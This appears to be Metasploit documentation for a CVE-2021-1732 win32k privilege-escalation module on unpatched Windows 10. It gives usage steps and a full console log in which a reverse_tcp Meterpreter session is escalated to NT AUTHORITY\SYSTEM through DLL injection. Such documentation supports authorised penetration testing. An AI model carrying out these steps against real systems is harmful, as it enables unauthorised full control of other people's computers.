## Vulnerable Application
A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of
NT AUTHORITY\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being treated as an
offset despite being populated by an attacker-controlled value. This can be leveraged to achieve an out of bounds write
operation, eventually leading to privilege escalation.

### Installation And Setup
Windows 10 versions 1803 through 20H2 (without the patch) are vulnerable out of the box. This exploit module has been
tested on all 6 affected versions of Windows.

## Verification Steps

1. Start msfconsole
1. Get a Meterpreter session on a vulnerable host
1. Do: `use exploit/windows/local/cve_2021_1732_win32k`
1. Set the `SESSION` and `PAYLOAD` options
1. Do: `run`
1. You should get a shell.

## Scenarios

### Windows 10 Version 20H2 Build 19042.746 x64

```
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-JKM0HAD\aliddle
meterpreter > sysinfo
Computer        : DESKTOP-JKM0HAD
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > background 
[*] Backgrounding session 1...
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use exploit/windows/local/cve_2021_1732_win32k 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2021_1732_win32k) > set SESSION -1
SESSION => -1
msf6 exploit(windows/local/cve_2021_1732_win32k) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2021_1732_win32k) > set LHOST 192.168.159.128 
LHOST => 192.168.159.128
msf6 exploit(windows/local/cve_2021_1732_win32k) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Launching notepad to host the DLL...
[+] Process 7672 launched.
[*] Reflectively injecting the DLL into 7672...
[*] Sending stage (200262 bytes) to 192.168.159.66
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.66:60838) at 2021-03-15 17:56:28 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
